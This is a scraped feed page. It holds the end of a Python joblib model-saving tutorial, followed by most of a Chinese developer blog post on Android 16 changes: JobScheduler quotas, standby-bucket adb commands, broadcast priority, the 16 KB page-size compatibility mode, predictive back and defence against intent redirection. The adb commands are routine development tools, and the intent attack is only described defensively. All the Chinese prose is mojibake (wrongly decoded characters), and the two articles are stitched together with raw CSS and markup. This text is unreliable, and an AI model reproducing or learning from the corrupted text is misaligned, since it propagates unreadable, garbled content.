<p>è®­ç»ƒå¥½çš„æ¨¡å‹å¯ä¿å­˜ä¸ºæ–‡ä»¶ï¼Œåç»­ç›´æ¥åŠ è½½ä½¿ç”¨ï¼Œæ— éœ€é‡å¤è®­ç»ƒï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> joblib

<span class="hljs-comment"># ä¿å­˜æ¨¡å‹</span>
joblib.dump(best_model, <span class="hljs-string">"iris_rf_model.pkl"</span>)

<span class="hljs-comment"># åŠ è½½æ¨¡å‹</span>
loaded_model = joblib.load(<span class="hljs-string">"iris_rf_model.pkl"</span>)

<span class="hljs-comment"># ç”¨åŠ è½½çš„æ¨¡å‹é¢„æµ‹</span>
new_data = [[<span class="hljs-number">5.1</span>, <span class="hljs-number">3.5</span>, <span class="hljs-number">1.4</span>, <span class="hljs-number">0.2</span>]]  <span class="hljs-comment"># æ–°çš„é¸¢å°¾èŠ±ç‰¹å¾</span>
pred = loaded_model.predict(new_data)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"é¢„æµ‹ç±»åˆ«ï¼š<span class="hljs-subst">{iris.target_names[pred[<span class="hljs-number">0</span>]]}</span>"</span>)
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[äº†è§£ä¸€ä¸‹Android16æ›´æ–°äº‹é¡¹ï¼Œæ‹¿æä¸‹ä¸€æ³¢é€‚é…]]></title>    <link>https://juejin.cn/post/7595053284915822632</link>    <guid>https://juejin.cn/post/7595053284915822632</guid>    <pubDate>2026-01-15T01:55:09.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595053284915822632" data-draft-id="7590403249561108495" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="äº†è§£ä¸€ä¸‹Android16æ›´æ–°äº‹é¡¹ï¼Œæ‹¿æä¸‹ä¸€æ³¢é€‚é…"/> <meta itemprop="keywords" content="Android,Google,å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-15T01:55:09.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Coffeeee"/> <meta itemprop="url" content="https://juejin.cn/user/2089524588718126"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            äº†è§£ä¸€ä¸‹Android16æ›´æ–°äº‹é¡¹ï¼Œæ‹¿æä¸‹ä¸€æ³¢é€‚é…
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2089524588718126/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Coffeeee
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T01:55:09.000Z" title="Thu Jan 15 2026 01:55:09 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å»å¹´å¼„äº†ä¸€æ³¢Android15çš„é€‚é…ï¼Œç”±äºäº‹å…ˆæ²¡åšå•¥å‡†å¤‡ï¼Œæ‰€ä»¥åšçš„ä¹Ÿæ˜¯æ¯”è¾ƒåŒ†å¿™ï¼Œæ¯”è¾ƒè¢«åŠ¨ï¼Œå¯¼è‡´æŸäº›ç‰¹æ€§æ²¡æœ‰è¢«é€‚é…å°±æŠŠappå‘å¸ƒå‡ºå»äº†ï¼Œç»“æœå½“ç„¶æ˜¯åå¤è¢«puaï¼Œæ²¡åŠæ³•ï¼Œæ´»å¹²çš„ä¸åˆ°ä½å˜›ï¼Œç‰›é©¬å°±è¦æœ‰ç‰›é©¬çš„è§‰æ‚Ÿï¼Œç°åœ¨åˆ°äº†æ–°çš„ä¸€å¹´äº†ï¼ŒæŒ‰ç…§è°·æ­Œçš„æƒ¯ä¾‹ï¼Œä»Šå¹´ä¼°è®¡è¦è½®åˆ°Android16äº†ï¼Œå¦¥å¦¥çš„æ–°çš„ä¸€æ³¢OKRåœ¨å‘æˆ‘æ‹›æ‰‹ï¼Œé‚£ä¹ˆå’±å…ˆçœ‹çœ‹è¿™ä¸ªAndroid16é‡Œé¢æœ‰å•¥ä¸œè¥¿å€¼å¾—æˆ‘ä»¬å»æ³¨æ„çš„</p>
<h2 data-id="heading-0">JobScheduleré…é¢ä¼˜åŒ–</h2>
<p><code>JobScheduler</code>çš„é…é¢æ˜¯æŒ‡åº”ç”¨åœ¨ä¸€å®šæ—¶é—´å†…å¯ä»¥æ‰§è¡Œçš„jobæ•°é‡ï¼Œè€Œä»Android16å¼€å§‹ï¼Œ<code>JobScheduler</code>çš„é…é¢ä¼šæ ¹æ®ä»¥ä¸‹ä¸‰ä¸ªå…ƒç´ è€Œå‘ç”Ÿæ”¹å˜</p>
<ul>
<li><strong>åº”ç”¨æ‰€å¤„çš„å¾…æœºå­˜å‚¨åˆ†åŒº(standby bucket)</strong>:æ´»è·ƒçš„å¾…æœºå­˜å‚¨åˆ†åŒºçš„åº”ç”¨å°†å¼€å§‹é€šè¿‡å®½æ¾çš„è¿è¡Œæ—¶é…åˆå¼ºåˆ¶æ‰§è¡Œ</li>
<li><strong>å¦‚æœä½œä¸šåœ¨åº”ç”¨å¤„äºå‰å°çŠ¶æ€æ—¶å¼€å§‹æ‰§è¡Œ</strong>ï¼šå¦‚æœä½œä¸šåœ¨åº”ç”¨å¯¹ç”¨æˆ·å¯è§æ—¶å¼€å§‹æ‰§è¡Œï¼Œå¹¶åœ¨åº”ç”¨å˜ä¸ºä¸å¯è§åç»§ç»­æ‰§è¡Œï¼Œåˆ™ä¼šéµå®ˆä½œä¸šè¿è¡Œæ—¶é…é¢</li>
</ul>
<p>å¦‚æœæƒ³è¦å–æ¶ˆè¿™ç§è®¾ç½®ï¼Œå¯ä»¥æ‰§è¡Œä»¥ä¸‹adbå‘½ä»¤</p>
<pre><code class="hljs language-bash" lang="bash">adb shell am compat <span class="hljs-built_in">enable</span> OVERRIDE_QUOTA_ENFORCEMENT_TO_TOP_STARTED_JOBS APP_PACKAGE_NAME
</code></pre>
<ul>
<li><strong>å¦‚æœä½œä¸šåœ¨è¿è¡Œå‰å°æœåŠ¡æ—¶æ‰§è¡Œ</strong>ï¼šä¸å‰å°æœåŠ¡åŒæ—¶æ‰§è¡Œçš„ä½œä¸šå°†éµå®ˆä½œä¸šè¿è¡Œæ—¶é…é¢</li>
</ul>
<p>å¦‚æœæƒ³è¦å–æ¶ˆè¿™ç§è®¾ç½®ï¼Œå¯ä»¥æ‰§è¡Œä»¥ä¸‹adbå‘½ä»¤</p>
<pre><code class="hljs language-bash" lang="bash">adb shell am compat <span class="hljs-built_in">enable</span> OVERRIDE_QUOTA_ENFORCEMENT_TO_FGS_JOBS APP_PACKAGE_NAME
</code></pre>
<p>æœ‰çš„äººå¯èƒ½ä¸çŸ¥é“ä»€ä¹ˆæ˜¯å¾…æœºå­˜å‚¨åˆ†åŒºï¼Œå¯ä»¥è¿™ä¹ˆç†è§£ï¼Œç³»ç»Ÿä¼šç»™æ‰€æœ‰åº”ç”¨å®‰æ’äº†äº”ä¸ªåˆ†åŒºï¼Œç³»ç»Ÿä¼šæ ¹æ®æ¯ä¸ªåº”ç”¨æœ€è¿‘ä»€ä¹ˆæ—¶å€™ä½¿ç”¨ä»¥åŠä½¿ç”¨é¢‘ç‡æ¥åˆ†é…è‡³å„ä¸ªåˆ†åŒºï¼Œæœ‰ç‚¹åƒè¯»ä¹¦æ—¶å€™å­¦æ ¡ç»™æˆ‘ä»¬åˆ†ç­ï¼Œå­¦ä¹ å¥½çš„åˆ†åˆ°é‡ç‚¹ç­ï¼Œå­¦ä¹ ä¸€èˆ¬çš„åˆ†åˆ°æ™®é€šç­ï¼Œä¸åŒåˆ†åŒºçš„åº”ç”¨æ”¶åˆ°çš„ç³»ç»Ÿçš„é™åˆ¶ä¹Ÿå°±ä¸ä¸€æ ·ï¼Œæ¯”å¦‚æ´»è·ƒåŒºçš„åº”ç”¨çš„ä½œä¸šï¼Œå¯ä»¥ç›¸å¯¹è·å¾—æ›´å¥½æ›´å¤šçš„è¿è¡Œèµ„æºï¼Œç›¸å½“äºé‡ç‚¹ç­çš„å­¦ç”Ÿï¼Œå¾—åˆ°çš„å¸ˆèµ„æ°´å¹³è‚¯å®šéƒ½æ˜¯æœ€å¥½çš„ï¼Œé‚£ä¹ˆå¦‚ä½•çŸ¥é“å½“å‰è‡ªå·±çš„åº”ç”¨å¤„äºå“ªä¸ªåˆ†åŒºå‘¢,å¯ä»¥ä½¿ç”¨ä»¥ä¸‹adbå‘½ä»¤</p>
<pre><code class="hljs language-js" lang="js">adb shell am get-standby-bucket <span class="hljs-variable constant_">APP_PACKAGE_NAME</span>
</code></pre>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f06782b81cc74ca2982b789a271ccf4c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29mZmVlZWU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769046909&amp;x-signature=xnOuS0sljX%2B9JIX0e1JWBVYCf9U%3D" alt="image.png" width="90%" loading="lazy"/>
<p>å¦‚æœå¾—åˆ°ç»“æœæ˜¯10å°±è¯´æ˜ä½ çš„åº”ç”¨å¤„äºæ´»è·ƒåŒºï¼Œä¸å—ç³»ç»Ÿé™åˆ¶ï¼Œä»»ä½•å¤§äº10çš„æ•°å­—ï¼Œéƒ½è¯´æ˜ä½ çš„åº”ç”¨ä¼šè¢«ç³»ç»Ÿé™åˆ¶ï¼Œæˆ–è€…ä½ æƒ³è¦çœ‹çœ‹ä½ çš„åº”ç”¨å¤„äºæŸä¸ªåˆ†åŒºä¼šæœ‰å“ªäº›è¡Œä¸ºï¼Œé‚£ä¹ˆå¯ä»¥å°è¯•å¦‚ä¸‹å‘½ä»¤</p>
<pre><code class="hljs language-arduino" lang="arduino">adb shell am set-standby-bucket APP_PACKAGE_NAME active|working_set|frequent|rare|restricted
</code></pre>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b4a07f4cd1b04a15a74770a78535577b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29mZmVlZWU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769046909&amp;x-signature=iK5h6zpsz5H%2FFgtL13QCC99Foy4%3D" alt="image.png" width="90%" loading="lazy"/>
<h2 data-id="heading-1">æ–°çš„ä½œä¸šåœæ­¢åŸå› </h2>
<p>åœ¨Android16ä¹‹å‰ï¼Œå¦‚æœæƒ³è¦çŸ¥é“ä½œä¸šåœæ­¢çš„åŸå› ï¼Œä¸ºä»€ä¹ˆä¼šäº§ç”ŸåºŸå¼ƒä½œä¸šï¼Œå°±å¿…é¡»å»ç›‘å¬<code>STOP_REASON_TIMEOUT</code>è¿™ä¸ªå­—æ®µï¼Œè€Œåœ¨Android16ä¸­ï¼Œè¿™ä¸ªå­—æ®µè¢«åºŸå¼ƒäº†ï¼Œæ”¹ä¸º<code>STOP_REASON_TIMEOUT_ABANDONED</code>ï¼Œç›¸å…³åº”ç”¨éœ€è¦ä¸ºæ­¤åšç›¸åº”é€‚é…</p>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/28402796c31543fca72f56e0e9ea33ef~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29mZmVlZWU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769046909&amp;x-signature=nb%2BdiEnp%2F8TyrxRw5GzQc29o9n8%3D" alt="image.png" width="90%" loading="lazy"/>
<h2 data-id="heading-2">æœ‰åºå¹¿æ’­çš„ä¼˜å…ˆçº§èŒƒå›´</h2>
<p>å¦‚æœæƒ³è¦ç»™åº”ç”¨ä¸­çš„è‹¥å¹²å¹¿æ’­è®¾ç½®ä¸ªä¼˜å…ˆçº§ï¼Œç”¨æ¥ç»™å¹¿æ’­æ¥æ”¶å™¨æ¥æ”¶å’Œå¤„ç†æ¶ˆæ¯æœ‰ä¸ªå…ˆåé¡ºåºï¼Œé€šå¸¸è¦ä¹ˆæ˜¯åœ¨æ¸…å•æ–‡ä»¶ä¸­é™æ€è®¾ç½®<code>android:priority</code>,è¦ä¹ˆå°±æ˜¯åœ¨ä»£ç ä¸­åŠ¨æ€è®¾ç½®<code>IntentFilter.setPriority</code>ï¼Œè¿™æ ·èƒ½ä¿è¯æ— è®ºä½ çš„åº”ç”¨æ˜¯å•è¿›ç¨‹è¿˜æ˜¯å¤šè¿›ç¨‹ï¼Œæ¥æ”¶å™¨éƒ½èƒ½æŒ‰ç…§é¡ºåºæ¥æ”¶å¤„ç†æ¶ˆæ¯ï¼Œä½†æ˜¯<strong>Android16é‡Œé¢å°†è¿™ä¸ªä¼˜å…ˆçº§èŒƒå›´æ”¹äº†ï¼Œæ”¹æˆè¿™ä¸ªä¼˜å…ˆçº§åªåœ¨å•è¿›ç¨‹æœ‰æ•ˆï¼Œå¦‚æœæ˜¯å¤šè¿›ç¨‹ï¼Œå°†æ— æ³•ä¿è¯å¹¿æ’­æ¥æ”¶å™¨æ‰§è¡Œå’Œæ¥æ”¶æ¶ˆæ¯çš„å…ˆåé¡ºåº</strong></p>
<p>å¦å¤–éç³»ç»Ÿç»„ä»¶çš„ä¼˜å…ˆçº§åŒºé—´åªèƒ½åœ¨(<code>SYSTEM_LOW_PRIORITY</code> + 1, <code>SYSTEM_HIGH_PRIORITY</code> - 1)åŒºé—´å†…ï¼Œåªæœ‰ç³»ç»Ÿç»„ä»¶æ‰å¯ä»¥è®¾ç½®SYSTEM_LOW_PRIORITYï¼ŒSYSTEM_HIGH_PRIORITY</p>
<h2 data-id="heading-3">16 KB é¡µé¢å¤§å°å…¼å®¹æ¨¡å¼</h2>
<p>åˆšå¯¹é½å®Œ16kbçš„æˆ‘è¿˜æ²¡ç¼“è¿‡æ¥ï¼Œè¿™ä¸‹åˆçœ‹åˆ°è¿™å‡ ä¸ªå­—ï¼Œç€å®è®©æˆ‘çœ¼çš®è¹¦äº†å‡ ä¸‹ï¼Œå¿ƒæƒ³æ²¡å®Œå•¦ï¼Ÿä¸è¿‡è¿˜å¥½ä»”ç»†çœ‹äº†çœ‹ï¼Œå°±æ˜¯å¼„äº†ä¸ªå…¼å®¹æ¨¡å¼ï¼Œç”šè‡³ä¹‹å‰è¿˜é‡åˆ°è¿‡åªæ˜¯ä¸çŸ¥é“è¿™åŸæ¥æ˜¯Android16é‡Œé¢çš„feature,å…¼å®¹æ¨¡å¼å°±æ˜¯ä¸‹é¢è¿™ä¸ªæ¡†å­</p>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e9bb1762e5ee42b9a54049c343ca589a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29mZmVlZWU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769046909&amp;x-signature=M2K49wQc%2BDGqrcMgT%2BFDeLGfVPs%3D" alt="image.png" width="70%" loading="lazy"/>
<p>å‡ºç°è¿™ä¸ªæ¡†å­çš„å‰ææ˜¯ä½ çš„åº”ç”¨è¿è¡Œåœ¨äº†ä¸ä½äºAndroid16çš„è®¾å¤‡ä¸Šå¹¶ä¸”æ²¡æœ‰å®Œå…¨å¯¹é½16kbï¼Œé‚£ä¹ˆä¼šå‡ºç°è¿™ä¸ªå¼¹æ¡†è­¦å‘Šä½ ä¸€ä¸‹ï¼Œä½†æ˜¯ä¸å½±å“appä½¿ç”¨ï¼Œä¸ç®¡ä½ çš„targetæ˜¯35è¿˜æ˜¯36éƒ½ä¼šçœ‹åˆ°è¿™ä¸ªå¼¹æ¡†ï¼Œè€Œä¸”å¦‚æœä½ ä¸æƒ³è¦è®©è¿™ä¸ªå¼¹æ¡†å‡ºç°ï¼Œå¯ä»¥åœ¨<code>AndroidManifest.xml</code>ä¸­æ·»åŠ ä¸‹é¢è¿™ä¸ªé…ç½®
<code>android:pageSizeCompat="enabled"</code>,é‚£ä¹ˆå¼¹æ¡†å°±ä¸ä¼šå‡ºç°äº†,ä½¿ç”¨<code>pageSizeCompat</code>å¿…é¡»å¾—å°†targetSdkå‡çº§åˆ°36,ä½†è™½ç„¶å®˜æ–¹è§£é‡Šå¦‚æ­¤ï¼Œä½†æ˜¯æˆ‘è‡ªå·±å°è¯•ä¸‹åå‘ç°æ— è®ºå°†<code>pageSizeCompat</code>è®¾ç½®ä¸º<code>enabled</code>è¿˜æ˜¯<code>disabled</code>éƒ½æ— æ³•é˜»æ­¢å¼¹æ¡†å‡ºç°ï¼Œæ— è®ºæ˜¯debugè¿˜æ˜¯releaseåŒ…éƒ½å°è¯•äº†æ²¡æœ‰ä»»ä½•å˜åŒ–ï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯æ¨¡æ‹Ÿå™¨çš„å…³ç³»ï¼Œåè€Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ˜¯å¯ä»¥çš„</p>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/65954730fbc5419a910f9eb43af4bc80~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29mZmVlZWU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769046909&amp;x-signature=nhWEd6pFSFotLyZe9VFP%2BMps3k4%3D" alt="image.png" width="90%" loading="lazy"/>
<p>è¿™ä¿©å‘½ä»¤ç”¨äºå¼ºåˆ¶æ‰“å¼€16kbå‘åå…¼å®¹æ¨¡å¼ï¼Œå½“è®¾ç½®å®Œåï¼Œå†ä¸€æ¬¡å¯åŠ¨åº”ç”¨å°±ä¸ä¼šçœ‹åˆ°é‚£ä¸ªè­¦å‘Šå¼¹æ¡†äº†ï¼Œç¬¬ä¸€æ¡å‘½ä»¤æ˜¯æ§åˆ¶åŠ è½½åº“çš„æ–¹å¼ï¼Œç¬¬äºŒæ¡å‘½ä»¤æ˜¯ç”¨äºæ§åˆ¶apkçš„å®‰è£…æ–¹å¼</p>
<h2 data-id="heading-4">é¢„æµ‹æ€§è¿”å›æ”¯æŒä¸‰æŒ‰é’®</h2>
<p>Android16é‡Œé¢å¯¹é¢„æµ‹æ€§è¿”å›åšäº†è¿›ä¸€æ­¥æ›´æ”¹ï¼Œé•¿æŒ‰è¿”å›é”®å¯ä»¥è§¦å‘é¢„æµ‹æ€§è¿”å›åŠ¨ç”»ï¼Œæ”¯æŒè¿”å›åˆ°æ¡Œé¢ï¼Œä»»åŠ¡é—´åˆ‡æ¢ï¼Œactivityé—´åˆ‡æ¢</p>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4d44d05cc7b1461cb7f7cf4a4ff0ac64~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29mZmVlZWU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769046909&amp;x-signature=SS%2FLOYlIblK5Lo%2FL2OWz53ngeJM%3D" alt="001.gif" width="50%" loading="lazy"/>
<h2 data-id="heading-5">é˜²èŒƒIntenté‡å®šå‘æ”»å‡»</h2>
<h3 data-id="heading-6">ä»€ä¹ˆæ˜¯Intenté‡å®šå‘</h3>
<p>å½“ä¸€ä¸ªæ˜“å—æ”»å‡»çš„appå”¤èµ·äº†ä¸€ä¸ªç»„ä»¶çš„æ—¶å€™ï¼Œæ”»å‡»è€…ä¼šå…¨éƒ¨æˆ–è€…éƒ¨åˆ†åœ°æ§åˆ¶ä½intent,ç„¶åä¼šåœ¨å—å®³appçš„ä¸Šä¸‹æ–‡ä¸­æ‰“å¼€æŸäº›éšç§æ“ä½œï¼Œæˆ–è€…æˆªå–urlæ¥è·å–ä¸€äº›æ•æ„Ÿæ•°æ®ï¼Œç”šè‡³å¯èƒ½ç›—çªƒæ•°æ®</p>
<h3 data-id="heading-7">å¦‚ä½•é˜²èŒƒ</h3>
<h4 data-id="heading-8">target36æˆ–ä»¥ä¸Š</h4>
<p>ä½¿ç”¨æœ€æ–°apiæ–¹æ³•<code>removeLaunchSecurityProtection()</code>æ¥æŠµå¾¡æ”»å‡»</p>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/898e0f9264af40dfbc7fab229b75254a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29mZmVlZWU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769046909&amp;x-signature=mUReou%2FzILawHGbY7JZR6OdETRk%3D" alt="image.png" width="80%" loading="lazy"/>
<h4 data-id="heading-9">target35æˆ–ä»¥ä¸‹</h4>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3d00cc8082b1422db2a239be7efa5271~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29mZmVlZWU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769046909&amp;x-signature=9ZCXwx4GRci6RvaGdqi6a1dS8tI%3D" alt="image.png" width="80%" loading="lazy"/>
<h2 data-id="heading-10">åœç”¨æ— è¾¹æ¡†è®¾è®¡çš„é€‰æ‹©é€€å‡ºåŠŸèƒ½</h2>
<p>ä»è¿™é‡Œå¼€å§‹è®²çš„å˜åŠ¨éƒ½æ˜¯é’ˆå¯¹ç›®æ ‡å¹³å°éƒ½æŒ‡å‘36çš„åº”ç”¨ï¼Œé¦–å…ˆçœ‹åˆ°çš„æ˜¯æ— è¾¹æ¡†è®¾è®¡ï¼Œä¸Šä¸€ç¯‡æ–‡ç« ä¸­è®²åˆ°äº†åº”ç”¨çš„ç›®æ ‡å¹³å°å¦‚æœæŒ‡å‘35åï¼Œæ— è¾¹æ¡†è®¾è®¡å°†ä¼šé»˜è®¤è¢«å¼€å¯ï¼Œéœ€è¦ä½¿ç”¨<code>WindowInsets</code>æ¥ç»™åº”ç”¨åŠ ä¸Šè¾¹è¡¬åŒºæ‰å¯ä»¥å¤„ç†é‚£äº›è¢«é®æŒ¡çš„é—®é¢˜ï¼Œä½†æ˜¯æœ‰ä¸€ä¸ªå¼€å…³<code>windowOptOutEdgeToEdgeEnforcement</code>å¦‚æœå°†å®ƒæ‰“å¼€ï¼Œé‚£ä¹ˆç³»ç»Ÿä¼šè‡ªåŠ¨ç»™ä½ å…³é—­æ— è¾¹æ¡†è®¾è®¡åŠŸèƒ½</p>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/446b5e3214664d41a04f71f4f91636be~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29mZmVlZWU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769046909&amp;x-signature=Xgbut4cR3tJ38xiJwL7fqlpWlx4%3D" alt="image.png" width="90%" loading="lazy"/>
<p>æˆ‘æŠŠä¹‹å‰æ¼”ç¤ºè¿‡çš„demoé‡Œé¢çš„é€‚é…ä»£ç æ³¨é‡Šæ‰ï¼Œç„¶åå°†Activityçš„ä¸»é¢˜é‡Œé¢åŠ ä¸Š<code>windowOptOutEdgeToEdgeEnforcement</code>å±æ€§å¹¶æ‰“å¼€ï¼Œä¼šå‘ç°...</p>
